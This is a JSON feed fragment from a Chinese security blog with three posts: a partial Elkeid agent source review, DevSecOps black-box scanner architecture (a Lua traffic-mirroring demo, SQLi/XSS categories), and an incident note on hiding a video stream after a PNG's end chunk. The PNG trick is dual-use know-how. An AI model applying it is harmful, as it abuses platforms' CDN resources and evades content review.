class=\"n\">Data</span><span class=\"o\">:</span> <span class=\"nb\">make</span><span class=\"p\">([]</span><span class=\"kt\">byte</span><span class=\"p\">,</span> <span class=\"m\">0</span><span class=\"p\">,</span> <span class=\"n\">defaultCap</span><span class=\"o\">*</span><span class=\"m\">2</span><span class=\"p\">),</span>        <span class=\"p\">}</span>    <span class=\"p\">}},</span> <span class=\"p\">{</span><span class=\"n\">New</span><span class=\"o\">:</span> <span class=\"k\">func</span><span class=\"p\">()</span> <span class=\"n\">any</span> <span class=\"p\">{</span>        <span class=\"k\">return</span> <span class=\"o\">&amp;</span><span class=\"n\">proto</span><span class=\"o\">.</span><span class=\"n\">EncodedRecord</span><span class=\"p\">{</span>            <span class=\"n\">Data</span><span class=\"o\">:</span> <span class=\"nb\">make</span><span class=\"p\">([]</span><span class=\"kt\">byte</span><span class=\"p\">,</span> <span class=\"m\">0</span><span class=\"p\">,</span> <span class=\"n\">defaultCap</span><span class=\"o\">*</span><span class=\"m\">3</span><span class=\"p\">),</span>        <span class=\"p\">}</span>    <span class=\"p\">}},</span>    <span class=\"p\">{</span><span class=\"n\">New</span><span class=\"o\">:</span> <span class=\"k\">func</span><span class=\"p\">()</span> <span class=\"n\">any</span> <span class=\"p\">{</span>        <span class=\"k\">return</span> <span class=\"o\">&amp;</span><span class=\"n\">proto</span><span class=\"o\">.</span><span class=\"n\">EncodedRecord</span><span class=\"p\">{</span>            <span class=\"n\">Data</span><span class=\"o\">:</span> <span class=\"nb\">make</span><span class=\"p\">([]</span><span class=\"kt\">byte</span><span class=\"p\">,</span> <span class=\"m\">0</span><span class=\"p\">,</span> <span class=\"n\">defaultCap</span><span class=\"o\">*</span><span class=\"m\">4</span><span class=\"p\">),</span>        <span class=\"p\">}</span>    <span class=\"p\">}},</span><span class=\"p\">}</span></code></pre></div></div><p>顺便看了一眼好像 <code class=\"language-plaintext highlighter-rouge\">zap</code> 下有个类似的 <a href=\"https://github.com/uber-go/zap/issues/1130\">issue</a></p><h3 id=\"14-heartbeat-更新\">1.4. Heartbeat 更新</h3><p>Cpu/Mem 逻辑问题修正，linux 下新增 <code class=\"language-plaintext highlighter-rouge\">host_serial</code>、<code class=\"language-plaintext highlighter-rouge\">dns</code>、<code class=\"language-plaintext highlighter-rouge\">gateway</code> 等</p><h3 id=\"15-plugin\">1.5. Plugin</h3><p>新增插件名称合法性校验，shutdown 标识位</p><h3 id=\"16-agent-状态\">1.6. Agent 状态</h3><p>目前看来暂时只有 running 和 abnormal，应该方便集群主动查询</p><h3 id=\"17-main-函数\">1.7. Main 函数</h3><p>之前通过 DEBUG 来控制 pprof 的方式，现在变更监听 3 个信号</p><h3 id=\"18-deploy-部分更新\">1.8. Deploy 部分更新</h3><ul>  <li>cgroup 挂载重启失效问题修复 (sysvinit)</li></ul><p>https://github.com/bytedance/Elkeid/issues/319，将这部分逻辑判断放置 <code class=\"language-plaintext highlighter-rouge\">elkeidctl</code> 中了。</p><div class=\"language-go highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">signal</span><span class=\"o\">.</span><span class=\"n\">Notify</span><span class=\"p\">(</span><span class=\"n\">sigs</span><span class=\"p\">,</span> <span class=\"n\">syscall</span><span class=\"o\">.</span><span class=\"n\">SIGTERM</span><span class=\"p\">,</span> <span class=\"n\">syscall</span><span class=\"o\">.</span><span class=\"n\">SIGUSR1</span><span class=\"p\">,</span> <span class=\"n\">syscall</span><span class=\"o\">.</span><span class=\"n\">SIGUSR2</span><span class=\"p\">)</span></code></pre></div></div><p>相比之前更加灵活了，SIGUSR1 用于 pprof 的启停， SIGUSR2 用于强制触发内存回收</p><h2 id=\"2-collector-插件\">2. Collector 插件</h2><blockquote>  <p>Collector 插件本次更新除了增加了容器、fatjar 等，还重构改进了代码结构，逻辑非常清晰，推荐大家仔细阅读，在这里就先不赘述 engine 调度的逻辑了</p></blockquote><h3 id=\"21-新增资产采集\">2.1. 新增资产采集</h3><p><code class=\"language-plaintext highlighter-rouge\">app.go</code> 支持了多种应用的采集，包括如下：</p><div class=\"language-go highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">ruleMap</span> <span class=\"o\">=</span> <span class=\"k\">map</span><span class=\"p\">[</span><span class=\"kt\">string</span><span class=\"p\">]</span><span class=\"o\">*</span><span class=\"n\">AppRule</span><span class=\"p\">{</span>    <span class=\"s\">\"apache2\"</span><span class=\"o\">:</span>         <span class=\"n\">apacheRule</span><span class=\"p\">,</span>    <span class=\"s\">\"httpd\"</span><span class=\"o\">:</span>           <span class=\"n\">apacheRule</span><span class=\"p\">,</span>    <span class=\"s\">\"nginx\"</span><span class=\"o\">:</span>           <span class=\"n\">nginxRule</span><span class=\"p\">,</span>    <span class=\"s\">\"redis-server\"</span><span class=\"o\">:</span>    <span class=\"n\">redisRule</span><span class=\"p\">,</span>    <span class=\"s\">\"rabbitmq-server\"</span><span class=\"o\">:</span> <span class=\"n\">rabbitmqRule</span><span class=\"p\">,</span>    <span class=\"s\">\"grafana-server\"</span><span class=\"o\">:</span>  <span class=\"n\">grafanaRule</span><span class=\"p\">,</span>    <span class=\"s\">\"mysqld\"</span><span class=\"o\">:</span>          <span class=\"n\">mysqlRule</span><span class=\"p\">,</span>    <span class=\"s\">\"postgres\"</span><span class=\"o\">:</span>        <span class=\"n\">postgresqlRule</span><span class=\"p\">,</span>    <span class=\"s\">\"mongod\"</span><span class=\"o\">:</span>          <span class=\"n\">mongodbRule</span><span class=\"p\">,</span>    <span class=\"s\">\"etcd\"</span><span class=\"o\">:</span>            <span class=\"n\">etcdRule</span><span class=\"p\">,</span>    <span class=\"s\">\"prometheus\"</span><span class=\"o\">:</span>      <span class=\"n\">prometheusRule</span><span class=\"p\">,</span>    <span class=\"s\">\"sqlservr\"</span><span class=\"o\">:</span>        <span class=\"n\">sqlserverRule</span><span class=\"p\">,</span>    <span class=\"s\">\"php-fpm\"</span><span class=\"o\">:</span>         <span class=\"n\">phpfpmRule</span><span class=\"p\">,</span>    <span class=\"s\">\"dockerd\"</span><span class=\"o\">:</span>         <span class=\"n\">dockerRule</span><span class=\"p\">,</span>    <span class=\"s\">\"containerd\"</span><span class=\"o\">:</span>      <span class=\"n\">containerdRule</span><span class=\"p\">,</span>    <span class=\"s\">\"kubelet\"</span><span class=\"o\">:</span>         <span class=\"n\">kubeletRule</span><span class=\"p\">,</span><span class=\"p\">}</span></code></pre></div></div><p>大致的采集逻辑是循环 <code class=\"language-plaintext highlighter-rouge\">/proc/</code> 目录 pid，从进程的根文件系统 <code class=\"language-plaintext highlighter-rouge\">/proc/&lt;pid&gt;/root</code> 去读取上述资产。是一个支持区分容器环境的资产采集</p><h3 id=\"22-integrity-采集\">2.2. Integrity 采集</h3><p>dpkg / rpm 信息采集，解析还是有一定代码量的，注意里面的 io 限流。跟小黑猪同学沟通，暂时不理解为啥不采集容器内的</p><h3 id=\"23-container-采集\">2.3. Container 采集</h3><blockquote>  <p>一些默认的容器运行时套接字，也是 kubernetes 中的 <a href=\"https://github.com/kubernetes/kubernetes/blob/8a259641532d12f730d0fc6b237d36206d405e52/cmd/kubeadm/app/constants/constants_unix.go\">constants</a></p></blockquote><div class=\"language-go highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">for</span> <span class=\"n\">_</span><span class=\"p\">,</span> <span class=\"n\">path</span> <span class=\"o\">:=</span> <span class=\"k\">range</span> <span class=\"p\">[]</span><span class=\"kt\">string</span><span class=\"p\">{</span>    <span class=\"s\">\"unix:///run/containerd/containerd.sock\"</span><span class=\"p\">,</span>    <span class=\"s\">\"unix:///run/crio/crio.sock\"</span><span class=\"p\">,</span>    <span class=\"s\">\"unix:///var/run/cri-dockerd.sock\"</span><span class=\"p\">,</span><span class=\"p\">}</span> <span class=\"p\">{</span></code></pre></div></div><p><code class=\"language-plaintext highlighter-rouge\">dockershim</code> 这种应该情况不用再覆盖</p><p>两种 client 的方式，分别为 <code class=\"language-plaintext highlighter-rouge\">criClient</code> 以及 <code class=\"language-plaintext highlighter-rouge\">dockerClient</code>。</p><h3 id=\"24-process-采集\">2.4. Process 采集</h3><p>Process 采集和之前版本有较大变动，增加了很多如 namespace, status 详细信息，抽象到结构体函数下，代码比之前清晰了许多</p><h3 id=\"25-software-采集\">2.5. Software 采集</h3><p>Software 主要感兴趣的部分是 Jar 的部分。主要代码在 <code class=\"language-plaintext highlighter-rouge\">findJar</code> 部分，根据 Jar 包名称获取 name 以及 sversion，通过在 <code class=\"language-plaintext highlighter-rouge\">META-INF/MANIFEST.MF</code> 中读取 <code class=\"language-plaintext highlighter-rouge\">Implementation-Version:</code> 来确定 version，这里也是区分容器的</p><h3 id=\"26-service-采集\">2.6. Service 采集</h3><p>Elkeid 中通过遍历解析获取</p><div class=\"language-go highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">var</span> <span class=\"n\">SearchDir</span> <span class=\"o\">=</span> <span class=\"p\">[]</span><span class=\"kt\">string</span><span class=\"p\">{</span>\t<span class=\"s\">\"/etc/systemd/system.control\"</span><span class=\"p\">,</span> <span class=\"s\">\"/run/systemd/system.control\"</span><span class=\"p\">,</span> <span class=\"s\">\"/run/systemd/transient\"</span><span class=\"p\">,</span>\t<span class=\"s\">\"/run/systemd/generator.early\"</span><span class=\"p\">,</span> <span class=\"s\">\"/etc/systemd/system\"</span><span class=\"p\">,</span> <span class=\"s\">\"/run/systemd/system\"</span><span class=\"p\">,</span>\t<span class=\"s\">\"/run/systemd/generator\"</span><span class=\"p\">,</span> <span class=\"s\">\"/usr/local/lib/systemd/system\"</span><span class=\"p\">,</span> <span class=\"s\">\"/usr/lib/systemd/system\"</span><span class=\"p\">,</span> <span class=\"s\">\"/run/systemd/generator.late\"</span><span class=\"p\">}</span></code></pre></div></div><p>在 Osquery 中，好像是 dbus 相关的请求和解析，具体的后面再详细分析</p><h2 id=\"3-baseline\">3. Baseline</h2><p>还没看…</p><h2>…</h2><p>暂时还没写完，只看到 collector 的部分，中间应该也有不对的地方，待我慢慢咀嚼…</p>",
            "url": "https://chriskalix.github.io/2022/12/04/dive-into-elkeid-v1-9-1",
            
            
            
            
            
            "date_published": "2022-12-04T00:00:00+01:00",
            "date_modified": "2022-12-04T00:00:00+01:00",
            
                "author":  {
                "name": "chriskali",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://chriskalix.github.io/2022/11/15/devsecops-blackbox",
            "title": "DevSecOps BlackBox",
            "summary": "DevSecOps BlackBox",
            "content_text": "简介黑盒扫描是 DevSecOps 中较为重要的一环，往往也是 SDL 建设初期最先配备，效果最好的安全工具。本文为工作记录的随笔，比较潦草不细节，主要是怕忘记了概要  本文将从以下几个部分开始讨论  黑盒扫描架构          流量镜像      消息去重      扫描 Payload      企业特性适配      API 生命周期        资产管理  问题管理          脏数据      黑盒扫描架构流量镜像  流量镜像通过在 Nginx 下加载 Lua 的形式，将数据包提取传输，demo 如下init_phase - 跳过access_phaselocal data = {}data[\"time\"] = ngx.now()data[\"scheme\"] = ngx.var.schemedata[\"uri\"]=ngx.var.uri data[\"client_ip\"] = ngx.var.remote_addrdata[\"args\"]=ngx.var.argsdata[\"host\"]=ngx.var.hostdata[\"method\"]= ngx.req.get_method() if data[\"method\"] == \"POST\" then\tif (ngx.req.get_body_file() == nil) then\t\tdata[\"post_data\"] = ngx.req.get_body_data()\tendendlocal headers, err = ngx.req.get_headers()if err ~= \"truncated\" then    -- 防止流量黑洞，在 Iast 扫描添加特殊标识过滤\tif not head[\"Iast\"] then\t\tdata[\"headers\"] = headers\t\tdata[\"resp_headers\"] = ngx.resp.get_headers()\telse\t\treturn\tendend-- move to worker if you needlocal async_producer = producer:new(broker_list, {producer_type = \"async\",request_timeout = 10000})local message = dkjson.encode(data)local ok, err = async_producer:send(\"iast\", nil, message)if not ok then\tdebug(err)endbody_filter_by_lua_file （敏感信息检测，先不放了）消息去重根据五元组进行过滤，分别为  METHOD  SCHEMA  HOST (WITH PORT)  PATH  PARAMS用 Bloom filter 过滤，理想汽车的 DevSecOps 文章里也是这么说的。其实也要考虑到 API 应用自身的问题，在接口五元组不变的情况下，内部逻辑仍有可能发生变化从而产生漏洞（例如下游接口变更等），每个接口需要有一个 TTL，所以方法逻辑如下  获取五元组，以及对应的 HASH  缓存这个 Hash，给定 TTL在接口数量不大的情况下，不用布隆过滤器也可以扫描 Payload这个其实比较定制化，对于大部分的漏洞扫描，都能在单次请求中完成判断，不需要多个报文上下文的形式。这里分类讨论因为扫描 Payload 这个部分，大部分情况可能需要自己去做。因为目前能看到的 xray 或者 AWVS 还是接管了整个扫描流程（即报文拆解，Payload 注入，报文拼接，漏洞判断），但是甲方的这种特质场景下，往往需要自己介入大部分流程。例如报文的解析，如果是 AES 加密需要先做解密，如果有 timestamp 或者 sign 校验需要手动构成等等看起来像是造轮子，其实轮子也是可以抽象的，按照上面步骤做成 plugin 即可SQL Injection  不光是 SQL 注入，stamparm 这个小哥很多的 Payload 很有意思，方便直接提取使用简单来说，如果根据 SQLMap 的话，SQL 注入可以分为很多种，BEUSTQ  Boolean  Error  Union  Stack  Time-based如果抽象简化一下，可以变成：  基于报错的 插入 Payload，匹配返回内容  基于布尔的 可以看一下 SQLMap 源码，有一个页面相似度的检测，记得好像是 0.96 认为是相似的，很早以前看过，挺有意思  基于时间的 这个其实比较简单， Time-based，有可能会有误报多的情况。发送多次即可XSSXSS经典题目之，XSS分类  Dom-based  Reflect  Store反射通过 chrome driver 或者匹配的形式检索可在单个包的上下文完成。Dom 的有一点特殊，后续可以展开讲（通过 source / sink 的方式，或者避免危险 sink 的方式）相关文章Store-based则通过反连平台判断，单个请求的上下文无法判断RCE / LFI …  本质上和上述同理Payload 搜集，单个上下文的判断企业特性适配  为什么 xray / awvs 这种无法无缝接入，肯定也是有原因的…企业内为了保证接口安全，通常会有反重放、加密、混淆等，通常 H5 的请求和 App 的请求等，处理也会不同。相当于在扫描器的前后，我们需要两个 Interface，处理掉解密加密的过程，这里没有什么特殊的地方，重点是需要去做适配API 管理 &amp; 生命周期  API资源本身的集中化管理，对安全来说是非常宝贵的数据接口生命周期事实上跟黑盒关系不是很大，我们从黑盒安全这个相对狭隘的角度窥测一下。我们要尽可能丰富 API 维度的数据，从 API 的上线时间，调用频次，返回信息打标，请求信息打标。黑盒以及IAST是为数不多的能直接对接口建立完整数据的工具，很多时候如果黑盒仅仅只是拿来扫描，会丧失掉很多有价值的有意义的数据之前汉堡也发过根据接口的 CVSS 评分，其实可以理解成一个 API 最终对应到了哪些数据操作。这个对数据安全以及后期的越权治理非常重要。方法也很简单，先根据 DB 打标（DB分级），然后根据黑盒的数据获取到全链路的请求 ID，查询最后实际操作的 DB。操作的 DB 越核心，越多，说明这个 API 越敏感。对于企业内大量级的 API，这是至关重要的资产管理跟上面 API 管理 &amp; 生命周期有所重复了。核心就是：不要只把黑盒作为一个扫描工具问题管理脏数据  特殊标识，压测标/扫描标，在 Agent 侧 hook 数据写入丢弃  影子库  …",
            "content_html": "<h1 id=\"简介\">简介</h1><p>黑盒扫描是 DevSecOps 中较为重要的一环，往往也是 SDL 建设初期最先配备，效果最好的安全工具。本文为工作记录的随笔，比较潦草不细节，主要是怕忘记了</p><h1 id=\"概要\">概要</h1><blockquote>  <p>本文将从以下几个部分开始讨论</p></blockquote><ul>  <li>黑盒扫描架构    <ul>      <li>流量镜像</li>      <li>消息去重</li>      <li>扫描 Payload</li>      <li>企业特性适配</li>      <li>API 生命周期</li>    </ul>  </li>  <li>资产管理</li>  <li>问题管理    <ul>      <li>脏数据</li>    </ul>  </li></ul><h1 id=\"黑盒扫描架构\">黑盒扫描架构</h1><h2 id=\"流量镜像\">流量镜像</h2><blockquote>  <p>流量镜像通过在 Nginx 下加载 Lua 的形式，将数据包提取传输，demo 如下</p></blockquote><p>init_phase - 跳过</p><p>access_phase</p><div class=\"language-lua highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"kd\">local</span> <span class=\"n\">data</span> <span class=\"o\">=</span> <span class=\"p\">{}</span><span class=\"n\">data</span><span class=\"p\">[</span><span class=\"s2\">\"time\"</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">ngx</span><span class=\"p\">.</span><span class=\"n\">now</span><span class=\"p\">()</span><span class=\"n\">data</span><span class=\"p\">[</span><span class=\"s2\">\"scheme\"</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">ngx</span><span class=\"p\">.</span><span class=\"n\">var</span><span class=\"p\">.</span><span class=\"n\">scheme</span><span class=\"n\">data</span><span class=\"p\">[</span><span class=\"s2\">\"uri\"</span><span class=\"p\">]</span><span class=\"o\">=</span><span class=\"n\">ngx</span><span class=\"p\">.</span><span class=\"n\">var</span><span class=\"p\">.</span><span class=\"n\">uri</span> <span class=\"n\">data</span><span class=\"p\">[</span><span class=\"s2\">\"client_ip\"</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">ngx</span><span class=\"p\">.</span><span class=\"n\">var</span><span class=\"p\">.</span><span class=\"n\">remote_addr</span><span class=\"n\">data</span><span class=\"p\">[</span><span class=\"s2\">\"args\"</span><span class=\"p\">]</span><span class=\"o\">=</span><span class=\"n\">ngx</span><span class=\"p\">.</span><span class=\"n\">var</span><span class=\"p\">.</span><span class=\"n\">args</span><span class=\"n\">data</span><span class=\"p\">[</span><span class=\"s2\">\"host\"</span><span class=\"p\">]</span><span class=\"o\">=</span><span class=\"n\">ngx</span><span class=\"p\">.</span><span class=\"n\">var</span><span class=\"p\">.</span><span class=\"n\">host</span><span class=\"n\">data</span><span class=\"p\">[</span><span class=\"s2\">\"method\"</span><span class=\"p\">]</span><span class=\"o\">=</span> <span class=\"n\">ngx</span><span class=\"p\">.</span><span class=\"n\">req</span><span class=\"p\">.</span><span class=\"n\">get_method</span><span class=\"p\">()</span> <span class=\"k\">if</span> <span class=\"n\">data</span><span class=\"p\">[</span><span class=\"s2\">\"method\"</span><span class=\"p\">]</span> <span class=\"o\">==</span> <span class=\"s2\">\"POST\"</span> <span class=\"k\">then</span>\t<span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">ngx</span><span class=\"p\">.</span><span class=\"n\">req</span><span class=\"p\">.</span><span class=\"n\">get_body_file</span><span class=\"p\">()</span> <span class=\"o\">==</span> <span class=\"kc\">nil</span><span class=\"p\">)</span> <span class=\"k\">then</span>\t\t<span class=\"n\">data</span><span class=\"p\">[</span><span class=\"s2\">\"post_data\"</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">ngx</span><span class=\"p\">.</span><span class=\"n\">req</span><span class=\"p\">.</span><span class=\"n\">get_body_data</span><span class=\"p\">()</span>\t<span class=\"k\">end</span><span class=\"k\">end</span><span class=\"kd\">local</span> <span class=\"n\">headers</span><span class=\"p\">,</span> <span class=\"n\">err</span> <span class=\"o\">=</span> <span class=\"n\">ngx</span><span class=\"p\">.</span><span class=\"n\">req</span><span class=\"p\">.</span><span class=\"n\">get_headers</span><span class=\"p\">()</span><span class=\"k\">if</span> <span class=\"n\">err</span> <span class=\"o\">~=</span> <span class=\"s2\">\"truncated\"</span> <span class=\"k\">then</span>    <span class=\"c1\">-- 防止流量黑洞，在 Iast 扫描添加特殊标识过滤</span>\t<span class=\"k\">if</span> <span class=\"ow\">not</span> <span class=\"n\">head</span><span class=\"p\">[</span><span class=\"s2\">\"Iast\"</span><span class=\"p\">]</span> <span class=\"k\">then</span>\t\t<span class=\"n\">data</span><span class=\"p\">[</span><span class=\"s2\">\"headers\"</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">headers</span>\t\t<span class=\"n\">data</span><span class=\"p\">[</span><span class=\"s2\">\"resp_headers\"</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">ngx</span><span class=\"p\">.</span><span class=\"n\">resp</span><span class=\"p\">.</span><span class=\"n\">get_headers</span><span class=\"p\">()</span>\t<span class=\"k\">else</span>\t\t<span class=\"k\">return</span>\t<span class=\"k\">end</span><span class=\"k\">end</span><span class=\"c1\">-- move to worker if you need</span><span class=\"kd\">local</span> <span class=\"n\">async_producer</span> <span class=\"o\">=</span> <span class=\"n\">producer</span><span class=\"p\">:</span><span class=\"n\">new</span><span class=\"p\">(</span><span class=\"n\">broker_list</span><span class=\"p\">,</span> <span class=\"p\">{</span><span class=\"n\">producer_type</span> <span class=\"o\">=</span> <span class=\"s2\">\"async\"</span><span class=\"p\">,</span><span class=\"n\">request_timeout</span> <span class=\"o\">=</span> <span class=\"mi\">10000</span><span class=\"p\">})</span><span class=\"kd\">local</span> <span class=\"n\">message</span> <span class=\"o\">=</span> <span class=\"n\">dkjson</span><span class=\"p\">.</span><span class=\"n\">encode</span><span class=\"p\">(</span><span class=\"n\">data</span><span class=\"p\">)</span><span class=\"kd\">local</span> <span class=\"n\">ok</span><span class=\"p\">,</span> <span class=\"n\">err</span> <span class=\"o\">=</span> <span class=\"n\">async_producer</span><span class=\"p\">:</span><span class=\"n\">send</span><span class=\"p\">(</span><span class=\"s2\">\"iast\"</span><span class=\"p\">,</span> <span class=\"kc\">nil</span><span class=\"p\">,</span> <span class=\"n\">message</span><span class=\"p\">)</span><span class=\"k\">if</span> <span class=\"ow\">not</span> <span class=\"n\">ok</span> <span class=\"k\">then</span>\t<span class=\"n\">debug</span><span class=\"p\">(</span><span class=\"n\">err</span><span class=\"p\">)</span><span class=\"k\">end</span></code></pre></div></div><p>body_filter_by_lua_file （敏感信息检测，先不放了）</p><div class=\"language-lua highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code></code></pre></div></div><h2 id=\"消息去重\">消息去重</h2><p>根据五元组进行过滤，分别为</p><ul>  <li>METHOD</li>  <li>SCHEMA</li>  <li>HOST (WITH PORT)</li>  <li>PATH</li>  <li>PARAMS</li></ul><p>用 <code class=\"language-plaintext highlighter-rouge\">Bloom filter</code> 过滤，理想汽车的 <code class=\"language-plaintext highlighter-rouge\">DevSecOps</code> 文章里也是这么说的。其实也要考虑到 <code class=\"language-plaintext highlighter-rouge\">API</code> 应用自身的问题，在接口五元组不变的情况下，内部逻辑仍有可能发生变化从而产生漏洞（例如下游接口变更等），每个接口需要有一个 TTL，所以方法逻辑如下</p><ol>  <li>获取五元组，以及对应的 HASH</li>  <li>缓存这个 Hash，给定 TTL</li></ol><p>在接口数量不大的情况下，不用布隆过滤器也可以</p><h2 id=\"扫描-payload\">扫描 Payload</h2><p>这个其实比较定制化，对于大部分的漏洞扫描，都能在单次请求中完成判断，不需要多个报文上下文的形式。这里分类讨论</p><p>因为扫描 Payload 这个部分，大部分情况可能需要自己去做。因为目前能看到的 xray 或者 AWVS 还是接管了整个扫描流程（即报文拆解，Payload 注入，报文拼接，漏洞判断），但是甲方的这种特质场景下，往往需要自己介入大部分流程。</p><p>例如报文的解析，如果是 AES 加密需要先做解密，如果有 timestamp 或者 sign 校验需要手动构成等等</p><p>看起来像是造轮子，其实轮子也是可以抽象的，按照上面步骤做成 plugin 即可</p><h3 id=\"sql-injection\">SQL Injection</h3><blockquote>  <p>不光是 SQL 注入，<a href=\"https://github.com/stamparm\">stamparm</a> 这个小哥很多的 Payload 很有意思，方便直接提取使用</p></blockquote><p>简单来说，如果根据 SQLMap 的话，SQL 注入可以分为很多种，BEUSTQ</p><ul>  <li>Boolean</li>  <li>Error</li>  <li>Union</li>  <li>Stack</li>  <li>Time-based</li></ul><p>如果抽象简化一下，可以变成：</p><ol>  <li>基于报错的 插入 Payload，匹配返回内容</li>  <li>基于布尔的 可以看一下 SQLMap 源码，有一个页面相似度的检测，记得好像是 <code class=\"language-plaintext highlighter-rouge\">0.96</code> 认为是相似的，很早以前看过，挺有意思</li>  <li>基于时间的 这个其实比较简单， Time-based，有可能会有误报多的情况。发送多次即可</li></ol><h3 id=\"xss\">XSS</h3><p>XSS经典题目之，XSS分类</p><ul>  <li>Dom-based</li>  <li>Reflect</li>  <li>Store</li></ul><p>反射通过 chrome driver 或者匹配的形式检索可在单个包的上下文完成。Dom 的有一点特殊，后续可以展开讲（通过 source / sink 的方式，或者避免危险 sink 的方式）<a href=\"https://medium.com/@fath3ad.22/understanding-dom-based-xss-sources-and-sinks-c17ae4bc7455\">相关文章</a></p><p>Store-based则通过反连平台判断，单个请求的上下文无法判断</p><h3 id=\"rce--lfi-\">RCE / LFI …</h3><blockquote>  <p>本质上和上述同理</p></blockquote><p>Payload 搜集，单个上下文的判断</p><h2 id=\"企业特性适配\">企业特性适配</h2><blockquote>  <p>为什么 xray / awvs 这种无法无缝接入，肯定也是有原因的…</p></blockquote><p>企业内为了保证接口安全，通常会有反重放、加密、混淆等，通常 H5 的请求和 App 的请求等，处理也会不同。相当于在扫描器的前后，我们需要两个 Interface，处理掉解密加密的过程，这里没有什么特殊的地方，重点是需要去做适配</p><h2 id=\"api-管理--生命周期\">API 管理 &amp; 生命周期</h2><blockquote>  <p>API资源本身的集中化管理，对安全来说是非常宝贵的数据</p></blockquote><p>接口生命周期事实上跟黑盒关系不是很大，我们从黑盒安全这个相对狭隘的角度窥测一下。我们要尽可能丰富 API 维度的数据，从 API 的上线时间，调用频次，返回信息打标，请求信息打标。黑盒以及IAST是为数不多的能直接对接口建立完整数据的工具，很多时候如果黑盒仅仅只是拿来扫描，会丧失掉很多有价值的有意义的数据</p><p>之前汉堡也发过根据接口的 CVSS 评分，其实可以理解成一个 API 最终对应到了哪些数据操作。这个对数据安全以及后期的越权治理非常重要。方法也很简单，先根据 DB 打标（DB分级），然后根据黑盒的数据获取到全链路的请求 ID，查询最后实际操作的 DB。操作的 DB 越核心，越多，说明这个 API 越敏感。对于企业内大量级的 API，这是至关重要的</p><h1 id=\"资产管理\">资产管理</h1><p>跟上面 API 管理 &amp; 生命周期有所重复了。核心就是：不要只把黑盒作为一个扫描工具</p><h1 id=\"问题管理\">问题管理</h1><h2 id=\"脏数据\">脏数据</h2><ul>  <li>特殊标识，压测标/扫描标，在 Agent 侧 hook 数据写入丢弃</li>  <li>影子库</li>  <li>…</li></ul>",
            "url": "https://chriskalix.github.io/2022/11/15/devsecops-blackbox",
            
            
            
            
            
            "date_published": "2022-11-15T00:00:00+01:00",
            "date_modified": "2022-11-15T00:00:00+01:00",
            
                "author":  {
                "name": "chriskali",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://chriskalix.github.io/2022/11/11/oss-related",
            "title": "OSS related Incident",
            "summary": "OSS related Incident",
            "content_text": "简介最近 OSS 桶相关发现了一个很有意思的小问题，简单做个记录，怕忘记了影响本身，这个可以算作一个没有什么危害的 “漏洞”，如果你提交到 SRC 的话，大概率会获得到一个低危甚至忽略。本身来说，这个问题确实也算不上什么安全问题，但是实际上会带来更广的影响问题描述每家都会有提供或者使用类似 OSS 服务的情况，使用方式非常简单，通常用户上传图片，平台侧前置了 CDN 给供用户访问图片。但是我们发现了一些，很有意思的现象，PNG图片可以当视频播放但是往往，这种问题不会直接暴露出现，因为图片的上传会有压缩、水印等处理，在图片受到影响或者破坏的情况下，该问题默认不存在那么他们是如何做到的呢？了解 PNG  PNG，全称为 Portable Network Graphics，是一种支持无损压缩的位图图形格式，支持索引、灰度、RGB三种颜色方案以及以及Alpha通道等特性。  另外这个适用于不止 PNG，未压缩的 JPG 这些同理大部分的格式等，都可以从 wikipedia 中发现问题的答案，以及我随手翻阅的 博客，有以下四个数据块  文件头数据块IHDR（header chunk）：包含有图像基本信息，作为第一个数据块出现并只出现一次。  调色板数据块PLTE（palette chunk）：必须放在图像数据块之前。  图像数据块IDAT（image data chunk）：存储实际图像数据。PNG数据允许包含多个连续的图像数据块。  图像结束数据IEND（image trailer chunk）：放在文件尾部，表示PNG数据流结束。简单来说，PNG 由文件署名和数据块两部分组成。常见的以 8950 4e47 0d0a 1a0a 开头，00 00 00 00 49 45 4E 44 AE 42 60 82 结尾的 IEND 数据块。通常情况下，解析图片只会解析到 IEND，而在 IEND 之后的数据是不会被图片解析的。如上面博客提到的，可以做数据隐藏，那么这有什么意义吗？在实际场景中还真有利用的视频流  在图片后面，添加一个兼容性很强的数据（数据格式），不会因为开头的一些”脏数据” 而影响使用，存在吗？答：视频流因为这当中涉及到一些视频流相关的，作者不是这方面的专家，所以不做过多原理的解释。详见 wikipedia直接在PNG图后拼接 0x47(G) + 188byte 数据，每次会从同步字节开始解析。在 PNG 开头的情况下，直接拼接视频流。甚至可以这么操作：curl http://xxxx/test.png -o test.mpeg直接播放就完了实际利用那么实际场景下，直接拼接一个大的视频，那不是太明显了吗？是的，所以有另外的办法，拼接一下放到 m3u8 即可。m3u8 相当于就是一个播放 list，每一个图片放几秒，拼接 小时级别的 电影，根本没啥问题。也就是一些自建视频站，能够开下去的原因，因为能够在线播放，还不用出 CDN 费用，有的时候会卡卡的，可能是资源被限速了…危害  CDN 资源浪费，资源费用增长  资源内容不受控制，因为本身会被当作 PNG 解析，不会审核视频内容（内容安全/严重）其他当然还有更花的…先不做公开了给个 demo，curl https://chriskaliX.github.io/assets/imgs/test.jpg -o test.mpeg",
